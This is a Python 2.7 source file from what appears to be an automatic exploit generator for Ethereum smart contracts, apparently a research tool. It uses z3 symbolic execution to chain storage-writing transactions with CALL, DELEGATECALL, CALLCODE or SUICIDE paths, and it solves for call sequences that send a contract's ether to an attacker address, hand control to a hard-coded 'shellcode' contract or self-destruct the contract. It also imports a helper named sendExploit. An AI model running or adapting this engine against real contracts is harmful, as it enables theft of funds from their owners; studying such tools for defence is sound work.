#!/usr/bin/env python2.7
import itertools
import logging
import resource
import sys
from binascii import unhexlify, hexlify
import json

from collections import defaultdict
from z3 import z3

from ethanalyze.constraints import model_to_calls, check_model_and_resolve
from ethanalyze.evm import concrete, CombinedSymbolicResult
from ethanalyze.project import Project

#R
from copy import copy
from ethanalyze.rpc_queries import getByteCode, getBalance, sendExploit
from ethanalyze.evm import SymbolicStorage, SymbolicEVMState, IntractablePath


logging.basicConfig(level=logging.INFO)
logging.basicConfig(level=logging.ERROR)
# logging.basicConfig(level=logging.DEBUG)

#used everytime in FULL and Part for get_constrains()
args_dict = {'TERM': [42],'SSTORE': [42], 'SUICIDE': [0], 'CALL': [1], 'CALLCODE': [1], 'DELEGATECALL': [1]}

class Nope(Exception):
    pass

def attempt_exploit_new_call(c_r, target_addr, critical_amount, target_amount=None, amount_check='+', initial_balance=None,
                              controlled_addrs=set()):
    # only_complex = True
    if (c_r.only_complex):  # skip this combination if it has NO internal-calls in the Symbolicresults triples - i.e. skip trivial exploit attempts
        # stack all the callee and tail parts ina list
        logging.info("attempt_exploit_new_call: only_complex is True; check if combination is trivial")
        check_list = []
        com = c_r.results
        for i, j, k in zip(com[0::3], com[1::3], com[2::3]):
            check_list.append(j)
            check_list.append(k)
        # check if all the list is None
        if (all(i is None for i in check_list)):
            logging.info("attempt_exploit_new_call: only_complex flag is up and this combination is trivial! Combined of vuln_r %d" % (
                c_r.results[0].xid))
            raise Nope

    #R: rewrite of call - with the critical amount
    #to be used later in replay_exploit.py
    c_r.critical_amount = critical_amount

    critical_addr = c_r.state.critical_address
    extra_constraints = []

    # if(c_r.state.critical_op in {'DELEGATECALL', 'CALLCODE', 'CALL'}):
    #     target_addr = int('0x4000000000000000000000000000000000000000', 16)
    #     logging.info('\nREWRITTEN TARGET ADDR to middle-man shell_contract !target_addr %s\n', target_addr)

    #CALL amount check:
    # critical_amount = c_r.state.critical_amount
    #old     amount = r.state.stack[-3]
    if (critical_amount != None): #i.e. it's a req_op = 'CALL'
        amount = critical_amount
        if not concrete(amount):
            amount = z3.simplify(amount)
            #R:
            # same thing we did for storage below; not sure if this is required!
            for subst in c_r.state._substitutions:
                amount = z3.substitute(amount, subst)

        # if not concrete(amount):
            if amount_check == '+':
                extra_constraints.append(z3.UGE(amount, target_amount))
            elif amount_check == '-':
                extra_constraints.append(z3.UGT(amount, 0))
                extra_constraints.append(z3.ULE(amount, target_amount))
            else:
                extra_constraints.append(amount == target_amount)
            final_balance = c_r.state.balance
            extra_constraints.append(z3.ULE(amount, final_balance))


        # ensure we're not spending more for this exploit than we gain
        total_spent = None
        for res in c_r.results[::3]:
            if(res != None):
                callvalue = z3.BitVec('CALLVALUE_%d' % res.xid, 256)
                extra_constraints.append(z3.ULE(callvalue, 10 * (10 ** 18)))  # keep it semi-reasonable: at most 10 Eth per call
                if total_spent is None:
                    total_spent = callvalue
                else:
                    total_spent += callvalue

        extra_constraints.append(z3.ULT(total_spent, amount))
        # also, ensure the contract does not require a unreasonable start-balance (>100 Eth)
        if not initial_balance:
            start_balance = z3.BitVec('BALANCE_%d' % c_r.results[0].xid, 256)
            extra_constraints.append(z3.ULE(start_balance, 100 * (10 ** 18)))

    #back to gathering constrains on addr
    # check if the last element on the stack is the Attacker's addr;
    # this was used in the old application as a sanity check!!
    if concrete(critical_addr):  # if it's a concrete and long- this is a concrete address on stack
        if isinstance(critical_addr, long) and (critical_addr == target_addr):
            # controlled_addrs.add(target_addr)
            # return attempt_exploit(c_r, extra_constraints, controlled_addrs)
            pass
            #jump below and do exit rutine
        else:  # (called_addr != target_addr):
            logging.info("ABORT attempt_exploit_new_call(); concrete(called_addr) = %s but doesn't match target_addr => %s \n" %  (critical_addr, target_addr))
            raise Nope  # nothing we can do; exec not exploitable
    else:  # it's symbolic - i.e. not concrete
        address = z3.simplify(critical_addr) #try to simplify it
        if not concrete(address):
            extra_constraints.append(z3.Extract(159, 0, address) == target_addr)
        else: #it's concrete after simplififcation
            if (str(address) == '0'):  # sanity check; if the top of stack addr is a zero; mening its not At. controlled; then no point in trying an execution
                logging.info('ABORT attempt_exploit_new_call(); z3.simplify(called_addr) => %s \n', address)
                raise Nope
            elif address == target_addr:
                pass                 #addr matches trg after simplifcation -cont to exit routine
            else:
                logging.info('ABORT attempt_exploit_new_call(); addr != target_addr %s\n', address)
                raise Nope

                # still not concrete - add as constraint
                # although we collected subtsitutions during the .combine() phase - if our extra_constraint has a storage tag - it wouldn't have any constraints
                # poiting to the initial_storage (default ; 0) thus it would think it's SAT;
                # to prevent this we subts any expression in simplified_crit_addr with any of the substitutions gathered during the .combine()phase
                # for subst in c_r.state._substitutions:
                #     address = z3.substitute(address, subst)
                # disabled subst loop becasue we now do it in the LazySubst obj created in .combine()

                # do the self._constraints = [z3.substitute... from .combine() here again - becasue we get a new extra cosntraint
                # contract_B example:
                #   simplified_crit_addr = BitVecRef: Concat(0, Extract(159, 0, STORAGE_1[0]))
                #   results[0] (head_r) has subst; should I go for c_r.states[0] or c_r.state ?
                #   c_r.state._substitutions[0] = <type 'tuple'>: (STORAGE_1, K(BitVec(256), 0))
                # Substitute every occurrence of storage in the expression with extra_subst. = ALPHA RENAMING
                # substitute(inExpression, (from, to))
                # substitute(x + 1, (x, y + 1)) --> Expr = [y + 1 + 1]

                # subst_crit_addr_constraint = [z3.substitute(c, extra_subst) for r in self.results for c in
                #                      r.constraints] + extra_constraints

    controlled_addrs.add(target_addr)
    return attempt_exploit(c_r, extra_constraints, controlled_addrs)

    # #OG attemt_call
    # def attempt_exploit_call(r, target_addr, target_amount, amount_check='+', initial_balance=None, controlled_addrs=set()):
    # addr = r.state.stack[-2]
    # if not concrete(addr):
    #     addr = z3.simplify(addr)
    #
    # amount = r.state.stack[-3]
    # if not concrete(amount):
    #     amount = z3.simplify(amount)
    #
    # extra_constraints = []
    #
    # if not concrete(addr):
    #     extra_constraints.append(z3.Extract(159, 0, addr) == target_addr)
    # else:
    #     if addr != target_addr:
    #         raise Nope
    #
    # if not concrete(amount):
    #     if amount_check == '+':
    #         extra_constraints.append(z3.UGE(amount, target_amount))
    #     elif amount_check == '-':
    #         extra_constraints.append(z3.UGT(amount, 0))
    #         extra_constraints.append(z3.ULE(amount, target_amount))
    #     else:
    #         extra_constraints.append(amount == target_amount)
    #     final_balance = r.state.balance
    #     extra_constraints.append(z3.ULE(amount, final_balance))
    #
    # # ensure we're not spending more for this exploit than we gain
    # total_spent = None
    # for res in r.results:
    #     callvalue = z3.BitVec('CALLVALUE_%d' % res.xid, 256)
    #     extra_constraints.append(z3.ULE(callvalue, 10 * (10 ** 18)))  # keep it semi-reasonable: at most 10 Eth per call
    #     if total_spent is None:
    #         total_spent = callvalue
    #     else:
    #         total_spent += callvalue
    #
    # extra_constraints.append(z3.ULT(total_spent, amount))
    #
    # # also, ensure the contract does not require a unreasonable start-balance (>100 Eth)
    # if not initial_balance:
    #     start_balance = z3.BitVec('BALANCE_%d' % r.results[0].xid, 256)
    #     extra_constraints.append(z3.ULE(start_balance, 100 * (10 ** 18)))
    #
    # # addresses under our control
    # # assume we also control the target address
    # controlled_addrs.add(target_addr)
    # return attempt_exploit(r, extra_constraints, controlled_addrs)
    # #END OF OG ATTEMPTCALL


def attempt_exploit_other_three(c_r, target_addr, controlled_addrs=set()):

    # only_complex = True
    if (c_r.only_complex):  # skip this combination if it has NO internal-calls in the Symbolicresults triples - i.e. skip trivial exploit attempts
        # stack all the callee and tail parts ina list
        logging.info("attempt_exploit_other_three: only_complex is True; check if combination is trivial")
        check_list = []
        com = c_r.results
        for i, j, k in zip(com[0::3], com[1::3], com[2::3]):
            check_list.append(j)
            check_list.append(k)
        # check if all the list is None
        if (all(i is None for i in check_list)):
            logging.info("attempt_exploit_other_three: only_complex flag is up and this combination is trivial! Combined of vuln_r xid %d" % (
                c_r.results[0].xid))
            raise Nope

    # R: rewrite for concrete addr
    critical_addr = c_r.state.critical_address
    extra_constraints = []

    # if (c_r.state.critical_op in {'SUICIDE'}):
    #     target_addr = int('0x4000000000000000000000000000000000000000', 16)
    #     logging.info('REWRITTEN TARGET ADDR directly to OWNER! target_addr == %s\n', target_addr)

    # check if the last element on the stack is the Attacker's addr;
    # this was used in the old application as a sanity check!!
    if concrete(critical_addr) and isinstance(critical_addr, long):  # if it's a concrete and long- this is a concrete address on stack
        if (critical_addr == target_addr):  # sanitycheck
            controlled_addrs.add(target_addr)
            return attempt_exploit(c_r, extra_constraints, controlled_addrs)
        else:  # (called_addr != target_addr):
            logging.info("ABORT attempt_exploit_other_three(); concrete(called_addr) = %s but doesn't match target_addr => %s \n" % (critical_addr,
                                                                                                                                     target_addr))
            raise Nope  # nothing we can do; exec not exploitable
    else:  # it's symbolic
        address = z3.simplify(critical_addr)
        # for subst in c_r.state._substitutions:
        #     address = z3.substitute(address, subst)
        #this subst loop is now redundant becasue we already do this in the Lazysubst while .combine()
        # extra_constraints.append(z3.Extract(159, 0, address) == target_addr)

        if not concrete(address):
            extra_constraints.append(z3.Extract(159, 0, address) == target_addr)
        else: #it's concrete after simplififcation
            if (str(address) == '0'):  # sanity check; if the top of stack addr is a zero; mening its not At. controlled; then no point in trying an execution
                logging.info('ABORT attempt_exploit_other_three(); z3.simplify(called_addr) => %s \n', address)
                raise Nope
            elif address == target_addr:
                pass                 #addr matches trg after simplifcation -cont to exit routine
            else:
                logging.info('ABORT attempt_exploit_other_three(); addr != target_addr %s\n', address)
                raise Nope


        # if (str(address) == '0'):  # sanity check; if the top of stack addr is a zero; mening its not At. controlled; then no point in trying an execution
        #     logging.info('ABORT attempt_exploit_other_three(); z3.simplify(called_addr) => %s \n', address)
        #     raise Nope
        # if not concrete(address):
        #     extra_constraints.append(z3.Extract(159, 0, address) == target_addr)
        #     pass
        # else:  # if its a conceret addr AND NOT the At. controlled; then there's nothing we can do
        #     if address != target_addr:
        #         raise Nope

    # addresses under our control
    # assume we also control the target address

    controlled_addrs.add(target_addr)
    return attempt_exploit(c_r, extra_constraints, controlled_addrs)


#does the entire constraint resolution and exploit code generation.
def attempt_exploit(c_r, extra_constraints, controlled_addrs=set()):
    # extra_constraints = []
    for res in c_r.results:
        if (res != None):
            expr = None
            for cont_addr in controlled_addrs: # cont_addr == '0x3cc7c038f7eea1b70014b788b821d675b13b8760L' if its the traget_addr (AT. addr)
                new_caller = z3.Extract(159, 0, z3.BitVec('CALLER_%d' % res.xid, 256)) == cont_addr
                if expr is None:
                    expr = new_caller
                else:
                    expr = z3.Or(expr, new_caller)
            extra_constraints.append(expr)

    try:
        '''#logging.debug('combined path constraints:')
        for i, c in enumerate(r.constraints + extra_constraints):
            #logging.debug('C%d: %s', i, simplify_non_const_hashes(c, r.sha_constraints.keys()))
        for i, (h, v) in enumerate(r.sha_constraints.iteritems()):
            #logging.debug('Hash %d: %s = KECCAK(%s)', i, h, v)'''

        model = check_model_and_resolve(c_r.constraints + extra_constraints, c_r.sha_constraints)

        # enforce we control all CALLER-addresses
        if any(model[v].as_long() not in controlled_addrs for v in model if v.name().startswith('CALLER')):
            logging.info("!!!!!!!!!!!!There's a address in model that doesn't correspond to a controlled_addr!!!!!!!!!!!!!")
            logging.info("!!!!!!!!!!!!There's a address in model that doesn't correspond to a controlled_addr!!!!!!!!!!!!!")
            logging.info("!!!!!!!!!!!!There's a address in model that doesn't correspond to a controlled_addr!!!!!!!!!!!!!")
            raise Nope
        #R: rewrite for debugging
        # for v in model:
        #     if v.name().startswith('CALLER') and (model[v].as_long() not in controlled_addrs):
        #         print v.name()
        #         print model[v].as_long()
        #         logging.info("There's a %s in model that doesn't correspond to a controlled_addr; %s " % (v.name(), hex(model[v].as_long()) ) )
        #         raise Nope

        return model_to_calls(model, c_r.idx_dict), c_r, model
    except IntractablePath as e:
        # logging.exception('Intractable Path/Constraints')
        raise Nope

def combined_exploit(p, flags, target_addr, target_amount, amount_check='+', initial_storage=dict(), initial_balance=None, max_calls=5 ):

    depth = 1 #max prepends allowed in symbolic resolve
    shellcode_addr = 0x3debc0a74cb1ed48d4282b859e91006c00808d91 #will be used in attempt_exploit on DC/CC

    ####@@@@**** Z1.1 get CC on callee/CALLER ******

    all_vuln = []
    all_calls = []
    all_callcodes = []
    all_delegatecalls = []
    all_suicides = []
    for op_code in flags: #{'CALL'}:#flags: #for op_code in flags: 'CALL', 'SUICIDE',
        #check callee for CC
        all_op_code_callee = []
                #def partial_head_callee(return_r_list, p, req_op, initial_storage, initial_balance, target_addr, amount_check='+'):
        ret_val = partial_head_callee(all_op_code_callee, p, op_code, target_amount, initial_storage, initial_balance, shellcode_addr, target_addr, amount_check, expression=None,
                        rec_depth=depth)
        if (ret_val != None):
                return ret_val
        logging.info("COMB: ------------ end of PART CYCLE on %s ------------ \n" % op_code)
        # all_calls.extend(all_op_code_callee)


        # check CALLER for CC
        all_op_code_CALLER = []
        ret_val = full_head_callee_tail(all_op_code_CALLER, p, op_code, target_amount, initial_storage, initial_balance, shellcode_addr, target_addr, amount_check, expression=None,
                        rec_depth=depth)
        if (ret_val != None):
                return ret_val
        logging.info("COMB: ------------ end of FULL CYCLE on %s ------------ \n" % op_code)
        # all_calls.extend(all_op_code_CALLER)

        # now stack them into the big list

        all_vuln.extend(all_op_code_callee)
        all_vuln.extend(all_op_code_CALLER)
        #now stack them into their corresponding lists
        if(op_code == 'CALL'):
            all_calls.extend(all_op_code_callee)
            all_calls.extend(all_op_code_CALLER)
        elif (op_code == 'CALLCODE'):
            all_callcodes.extend(all_op_code_callee)
            all_callcodes.extend(all_op_code_CALLER)
        elif (op_code == 'DELEGATECALL'):
            all_delegatecalls.extend(all_op_code_callee)
            all_delegatecalls.extend(all_op_code_CALLER)
        elif (op_code == 'SUICIDE'):
            all_suicides.extend(all_op_code_callee)
            all_suicides.extend(all_op_code_CALLER)
        else:#sanity
            logging.info(
                "unknown FLAG found - no match")
            return


    if not all_vuln:
        logging.info(" No vulnerable critical commands found, aborting")
        return
    logging.info("COMB: %s non-directly vulnerable critical command paths found", len(all_vuln))
    logging.info("= = = = = = END OF Critical-command PHASE = = = = = =\n")
    ####@@@@**** STATECHANGINGPATH FUSION ******

    all_ends = [] #=> all_state_changes

    all_callee_SSTORE = []
    ret_val = partial_head_callee(all_callee_SSTORE, p, 'SSTORE', target_amount, initial_storage, initial_balance, shellcode_addr, target_addr, amount_check, expression=None,
                        rec_depth=depth)
    all_ends.extend(all_callee_SSTORE)

    all_CALLER_SSTORE =[]
    ret_val = full_head_callee_tail(all_CALLER_SSTORE, p, 'SSTORE', target_amount, initial_storage, initial_balance, shellcode_addr, target_addr, amount_check, expression=None,
                        rec_depth=depth)
    all_ends.extend(all_CALLER_SSTORE)


    if not all_ends:
        logging.warn("COMB: No state-changing paths found, aborting")
        return
    logging.info("COMB: %s state-changing paths found",len(all_ends))
    logging.info("\n = = = = = = END OF SSTORE PHASE = = = = = = \n")

    ####@@@@**** Z1.2 try to prepend 1 SSTORE ******
    vuln_may_end_compatible = defaultdict(lambda: [[]])  # used later in second statechange stage
    for state_i, state_r in enumerate(all_ends):
        # writes = set(end_r.state.storage.writes) #not used?

        for vuln_i, vuln_r in enumerate(all_vuln):
            #todo disabled optimization; wasn't working with disjoint return
            # if not vuln_r.may_read_from(state_r):
            #     continue
            vuln_may_end_compatible[vuln_i][0].append(state_i)

            if (len(vuln_r) % 3 != 0):
                logging.warn("!@##$^&%$#@$&:something is wrong in the triple strcuture!#$$!^&*^$#@ - ABORT")

            if (len(state_r) % 3 != 0):
                logging.warn("!@##$^&%$#@$&:something is wrong in the triple strcuture!#$$!^&*^$#@ - ABORT")

            # propogate this critical over all the parts of the result
            # for r in state_r:
            # state_r[0].critical_addr = vuln_r[0].critical_addr

            logging.info("_1+1: CombinedSymbolicResult of vuln_r %d and state_r %d" % (vuln_r[0].xid, state_r[0].xid))
            combined = CombinedSymbolicResult()
            combined.disjoint_prepend(vuln_r)
            combined.disjoint_prepend(state_r)

            # set flag to be passed into attmept - true means only complex solutions will be checked
            combined.only_complex = p.complex_flag

            if (combined.calls > max_calls):  # no point in executing a combined that exceeds the max calls constant
                logging.info("_1+1: Combined of vuln_r %d and state_r %d is just too BIG!" % (vuln_r[0].xid, state_r[0].xid))
                continue
            combined._combine(initial_storage, initial_balance, vuln_r[0].critical_addr, vuln_r[0].critical_op)
            combined.simplify()
            try:  # try to see if one statechaning + 1 critical is enough for an exploit
                if vuln_r in all_calls: #meaining req_op is CALL
                    return attempt_exploit_new_call(combined, target_addr, vuln_r[0].critical_amount, \
                                                    target_amount=target_amount, amount_check=amount_check, initial_balance=initial_balance)
                elif(vuln_r in all_callcodes) or (vuln_r in all_delegatecalls):
                    return attempt_exploit_other_three(combined, shellcode_addr)
                else: #suicide, CC/DC
                    return attempt_exploit_other_three(combined, target_addr)
            except Nope:
                #REARRANGE
                #try to shuffle the prepends; i.e. reorder the state-prepends even if vuln triple has a symbolic_addr_prepend
                # if(len(vuln_r) > 3): #no sense in running this ona no-prepend vuln
                #     combined = CombinedSymbolicResult()
                #     final_r = vuln_r[0:3]
                #     for i in all_two_list_merges(vuln_r[3:], state_r):
                #         # for j in i:
                #         combined.disjoint_prepend(i)
                #         combined.disjoint_prepend(final_r)
                #         combined._combine(initial_storage, initial_balance, vuln_r[0].critical_addr, vuln_r[0].critical_op)
                #         combined.simplify()
                #         logging.info("trying a rearranged 1+1 comb")
                #         try:  # try to see if one statechaning + 1 critical is enough for an exploit
                #             if vuln_r in all_calls:  # meaining req_op is CALL
                #                 return attempt_exploit_new_call(combined, target_addr, vuln_r[0].critical_amount, \
                #                                                 target_amount=target_amount, amount_check=amount_check, initial_balance=initial_balance)
                #             else:
                #                 return attempt_exploit_other_three(combined, target_addr, vuln_r[0].critical_addr)
                #         except Nope:
                #             continue
                continue

    logging.info("====== END OF 1+1 PHASE ======\n")

    ####@@@@**** Z1.3 try to prepend 2+ SSTORE ******
    # logging.info("COMB: that didn't work; lets try to prepend MORE then one state-changing path")
    end_may_end_compatible = defaultdict(list)  ## product('ABCD', 'xy') --> Ax Ay Bx By Cx Cy Dx Dy
    # populate the storage_compatible dict with may_read_from results for all possible combinations of all_ends
    for (i, a_r), (j, b_r) in itertools.product(enumerate(all_ends), enumerate(all_ends)):  # diff combinations of ends
        # todo disabled optimization; wasn't working with disjoint return
        # if a_r.may_read_from(b_r):
        #     end_may_end_compatible[i].append(j)
        end_may_end_compatible[i].append(j)
    calls = [all_ends]
    while len(calls) < max_calls - 1:
        # create copy of all_ends
        # todo r.copy() couldn't handle a triple return_r
        # new_ends = [r.copy() for r in all_ends]
        # new_ends = [copy(r) for r in all_ends] #fix
        # todo nope this copy() doesnt give me a new xid when we're MxM the same prepend multiple times i.e. (1,1)
        # I wrote a new fucntion to do the copy while giving the indentical prepends a new xid like the old OG copy but for a triple structe
        new_ends = []
        for r in all_ends:
            head_r = r[0].copy() #do nomral copy and get new xid for the whole triple
            head_r.project = copy(r[0].project)
            triple_r = [None, None, None]

            if r[1] != None:
               callee_r =  r[1].disjoint_copy(head_r.xid)
               callee_r.project = copy(r[1].project)

               tail_r = r[2].disjoint_copy(head_r.xid)
               tail_r.project = copy(r[2].project)

               triple_r = [None, callee_r, tail_r]

            triple_r[0] = head_r
            new_ends.append(triple_r)

        calls.append(new_ends)
        # compatible is a dict of may_read_from combinations of x from all_vuln and r_end
        for k, v in vuln_may_end_compatible.iteritems():
            new_compatible = set()
            for c in v[-1]:
                new_compatible.update(end_may_end_compatible[c])
            v.append(sorted(new_compatible))

        # R: useless code; used to show vuln_may_end_compatible is altered in the above loop for later use below
        new_v_m_e_compatible = vuln_may_end_compatible
        # rearrange = [] #used late in rearrange

        for i, vuln_r in enumerate(all_vuln):
            for combo_ids in itertools.product(*new_v_m_e_compatible[i]):
                # zip example:
                ##  numberList = [1, 2, 3]
                ##  strList = ['one', 'two', 'three']
                ##  result = zip(numberList, strList)
                ##  {(2, 'two'), (3, 'three'), (1, 'one')}

                # propogate this ciritacal over all the parts of the result
                # for c, j in zip(calls, combo_ids):
                #     c[j][0].critical_addr = vuln_r[0].critical_addr
                    # for r in c[j]:
                        # r[0].critical_addr = vuln_r[0].critical_addr

                combo = [vuln_r] + [c[j] for c, j in zip(calls, combo_ids)]
                logging.info("_MxM: CombinedSymbolicResult of vuln_r %d and a %s states" % (vuln_r[0].xid, combo_ids))
                combined = CombinedSymbolicResult()

                for r in combo:
                    combined.disjoint_prepend(r)
                    if (len(r) % 3 != 0):
                        logging.warn("!@##$^&%$#@$&:something is wrong in the triple structure!#$$!^&*^$#@ - ABORT")

                #set flag to be passed into attmept - true means only complex solutions will be checked
                combined.only_complex = p.complex_flag

                if(combined.calls > max_calls): #no point in executing a combined that exceeds the max calls constant
                    logging.info("_MxM: Combined of vuln_r %d and a bunch of states is just too BIG!" % (vuln_r[0].xid))
                    # logging.debug('Combo too BIG!: %s', ', '.join('%x' % r.state.pc for r in combo[::-1]))
                    continue

                combined._combine(initial_storage, initial_balance, vuln_r[0].critical_addr, vuln_r[0].critical_op)
                combined.simplify()
                # rearrange.append(combo) #r used later for rearrangment
                try:
                    if vuln_r in all_calls:  # meaining req_op is CALL
                        return attempt_exploit_new_call(combined, target_addr, vuln_r[0].critical_amount, \
                                                        target_amount=target_amount, amount_check=amount_check, initial_balance=initial_balance)
                    elif (vuln_r in all_callcodes) or (vuln_r in all_delegatecalls):
                        return attempt_exploit_other_three(combined, shellcode_addr)
                    else:  # suicide
                        return attempt_exploit_other_three(combined, target_addr)
                except Nope:
                    continue

        logging.info("====== END OF MxM PHASE ======\n")

        ####@@@@**** SHUFFLE; if vlun has a prepend (len>3) then we can try to stick the sstore inbetween the prepend and the vuln execution ******
        vuln_may_end_compatible = defaultdict(lambda: [[]])  # used later in second statechange stage
        for state_i, state_r in enumerate(all_ends):
            # writes = set(end_r.state.storage.writes) #not used?

            for vuln_i, vuln_r in enumerate(all_vuln):
                # todo disabled optimization; wasn't working with disjoint return
                # if not vuln_r.may_read_from(state_r):
                #     continue
                vuln_may_end_compatible[vuln_i][0].append(state_i)

                if (len(vuln_r) % 3 != 0):
                    logging.warn("SHUFFLE:!@##$^&%$#@$&:something is wrong in the triple strcuture!#$$!^&*^$#@ - ABORT")

                if (len(state_r) % 3 != 0):
                    logging.warn("SHUFFLE:!@##$^&%$#@$&:something is wrong in the triple strcuture!#$$!^&*^$#@ - ABORT")

                # propogate this critical over all the parts of the result
                # for r in state_r:
                # state_r[0].critical_addr = vuln_r[0].critical_addr

                logging.info("SHUFFLE: CombinedSymbolicResult of vuln_r %d and state_r %d" % (vuln_r[0].xid, state_r[0].xid))
                # combined = CombinedSymbolicResult()
                # combined.disjoint_prepend(vuln_r)
                # combined.disjoint_prepend(state_r)
                # if (combined.calls > max_calls):  # no point in executing a combined that exceeds the max calls constant
                #     logging.info("_1+1: Combined of vuln_r %d and state_r %d is just too BIG!" % (vuln_r[0].xid, state_r[0].xid))
                #     continue
                # combined._combine(initial_storage, initial_balance, vuln_r[0].critical_addr, vuln_r[0].critical_op)
                # combined.simplify()

                # try to shuffle the prepends; i.e. reorder the state-prepends even if vuln triple has a symbolic_addr_prepend
                if (len(vuln_r) > 3):  # no sense in running this ona no-prepend vuln
                    combined = CombinedSymbolicResult()
                    final_r = vuln_r[0:3]
                    for i in all_two_list_merges(vuln_r[3:], state_r):
                        # for j in i:
                        combined.disjoint_prepend(i)
                        combined.disjoint_prepend(final_r)

                        # set flag to be passed into attmept - true means only complex solutions will be checked
                        combined.only_complex = p.complex_flag

                        combined._combine(initial_storage, initial_balance, vuln_r[0].critical_addr, vuln_r[0].critical_op)
                        combined.simplify()
                        logging.info("trying a rearranged 1+1 comb")
                        try:  # try to see if one statechaning + 1 critical is enough for an exploit
                            if vuln_r in all_calls:  # meaining req_op is CALL
                                return attempt_exploit_new_call(combined, target_addr, vuln_r[0].critical_amount, \
                                                                target_amount=target_amount, amount_check=amount_check, initial_balance=initial_balance)
                            else:
                                return attempt_exploit_other_three(combined, target_addr, vuln_r[0].critical_addr)
                        except Nope:
                            continue

        logging.info("====== END OF SHUFFLE PHASE ======\n")

    logging.info('Could not exploit any combination of CC and SSTORE paths even with %s state-changing paths prepended' % str(max_calls-1))
    return

    ##################################################################################
    #OLD combined_exploit
    ##################################################################################

    # #find SLOAD BBs in already existing BBs
    # sload_bbs = {ins.bb.start for ins in p.cfg.filter_ins('SLOAD')}
    #
    # # 4.3 Path Generation
    # #each "IF" identifies a "critical path" ending in CALL/CALLCODE/DELEGATECALL/SELFDESTRUCT
    # all_calls = []
    # if 'CALL' in flags:
    #     #find CALL instructios which are descendants of th root BB
    #     call_ins = p.cfg.filter_ins('CALL')
    #     if not call_ins:
    #         logging.info('No CALL instructions')
    #     logging.info('Found %d CALL instructions', len(call_ins))
    #     #get_constraints returns; yield call=ins, call_path=path, call_r=self.run_symbolic(path, inclusive)
    #     # 4.4.4 constraint results - combined
    #     # `get_constraints` does all the magic of enumerating paths through a CFG as well as symbolic execution of a path
    #     # (this is something that you will have to modify to adapt for inner calls).
    #     for call, call_path, call_r in p.get_constraints(call_ins, [1]): #going to SymbExec
    #         logging.info("Call: %s", call)
    #         logging.info("Path: %s", '->'.join('%x' % p for p in call_path))
    #         if set(call_path) & sload_bbs:
    #             # if there is a SLOAD on this path,
    #             # it might benefit from prepending a SSTORE later on?
    #             all_calls.append(call_r)
    #         #init CSR object
    #         combined = CombinedSymbolicResult()
    #         combined.prepend(call_r)
    #         combined._combine(initial_storage, initial_balance)
    #         combined.simplify()
    #         # Everytime a path is found, an exploit attempt is started using the respective `attempt_exploit_*` function.
    #         # attempt_exploit_call does the entire constraint resolution and exploit code generation.
    #         try:
    #             return attempt_exploit_call(combined, target_addr, target_amount, amount_check, initial_balance)
    #         except Nope:
    #             continue
    #     logging.info('All calls: %s', all_calls)
    #
    # all_callcodes = []
    # if 'CALLCODE' in flags:
    #     callcode_ins = p.cfg.filter_ins('CALLCODE')
    #     if not callcode_ins:
    #         logging.info('No CALLCODE instructions')
    #     logging.info('Found %d CALLCODE instructions', len(callcode_ins))
    #     for callcode, callcode_path, callcode_r in p.get_constraints(callcode_ins, [1]):
    #         logging.info("Callcode: %s", callcode)
    #         logging.info("Path: %s", '->'.join('%x' % p for p in callcode_path))
    #         if set(callcode_path) & sload_bbs:
    #             # if there is a SLOAD on this path,
    #             # it might benefit from prepending a SSTORE later on
    #             all_callcodes.append(callcode_r)
    #         combined = CombinedSymbolicResult()
    #         combined.prepend(callcode_r)
    #         combined._combine(initial_storage, initial_balance)
    #         combined.simplify()
    #         try:
    #             return attempt_exploit_callcode(combined, target_addr)
    #         except Nope:
    #             continue
    #     logging.info('All callcodes: %s', all_callcodes)
    #
    # all_delegatecalls = []
    # if 'DELEGATECALL' in flags:
    #     delegatecall_ins = p.cfg.filter_ins('DELEGATECALL')
    #     if not delegatecall_ins:
    #         logging.info('No DELEGATECALL instructions')
    #     logging.info('Found %d DELEGATECALL instructions', len(delegatecall_ins))
    #     #get_const returns: ins, path, self.run_symbolic(path, inclusive)
    #     for delegatecall, delegatecall_path, delegatecall_r in p.get_constraints(delegatecall_ins, [1]):
    #         logging.info("Delegatecall: %s", delegatecall)
    #         logging.info("Path: %s", '->'.join('%x' % p for p in delegatecall_path))
    #         if set(delegatecall_path) & sload_bbs:
    #             # if there is a SLOAD on this path,
    #             # it might benefit from prepending a SSTORE later on
    #             all_delegatecalls.append(delegatecall_r)
    #         combined = CombinedSymbolicResult()
    #         combined.prepend(delegatecall_r)
    #         combined._combine(initial_storage, initial_balance)
    #         combined.simplify()
    #         try:
    #             return attempt_exploit_delegatecall(combined, target_addr)
    #         except Nope:
    #             continue
    #     logging.info('All delegatecalls: %s', all_delegatecalls)
    #
    # all_suicides = []
    # if 'SUICIDE' in flags:
    #     suicide_ins = p.cfg.filter_ins('SUICIDE')
    #     if not suicide_ins:
    #         logging.info('No SUICIDE instructions')
    #     logging.info('Found %d SUICIDE instructions', len(suicide_ins))
    #     for suicide, suicide_path, suicide_r in p.get_constraints(suicide_ins, [0]):
    #         logging.info("Suicide: %s", suicide)
    #         logging.info("Path: %s", '->'.join('%x' % p for p in suicide_path))
    #         if set(suicide_path) & sload_bbs:
    #             # if there is a SLOAD on this path,
    #             # it might benefit from prepending a SSTORE later on
    #             all_suicides.append(suicide_r)
    #         combined = CombinedSymbolicResult()
    #         combined.prepend(suicide_r)
    #         combined._combine(initial_storage, initial_balance)
    #         combined.simplify()
    #         try:
    #             return attempt_exploit_suicide(combined, target_addr)
    #         except Nope:
    #             continue
    #     logging.info('All suicides: %s', all_suicides)
    # # END OF 4 critical ops BLOCKs
    #
    # all_vuln = all_calls + all_callcodes + all_delegatecalls + all_suicides
    #
    # if not all_vuln:
    #     logging.warn("No vulnerable CALL, CALLCODE, DELEGATECALL, or SUICIDE found, aborting")
    #     return
    #
    # # look for terminating paths that have a SSTORR in them, then combine one critical_r and such apath
    # end_ins = p.cfg.filter_ins('RETURN') + p.cfg.filter_ins('STOP')
    # if not end_ins:
    #     logging.info('No RETURN or STOP instructions')
    #     return
    # logging.info('Found %d RETURN and STOP instructions', len(end_ins))
    # vuln_may_end_compatible = defaultdict(lambda: [[]]) # list of lists
    # all_ends = []
    # for i, (end, end_path, end_r) in enumerate(p.get_constraints(end_ins, find_sstore=True)): #find_sstore=True
    #     logging.info("End: %s", end)
    #     logging.info("Path: %s", '->'.join('%x' % p for p in end_path))
    #     all_ends.append(end_r)
    #     writes = set(end_r.state.storage.writes)
    #     for j, vuln_r in enumerate(all_vuln):
    #         if not vuln_r.may_read_from(end_r):
    #             continue
    #         vuln_may_end_compatible[j][0].append(i)
    #         combined = CombinedSymbolicResult()
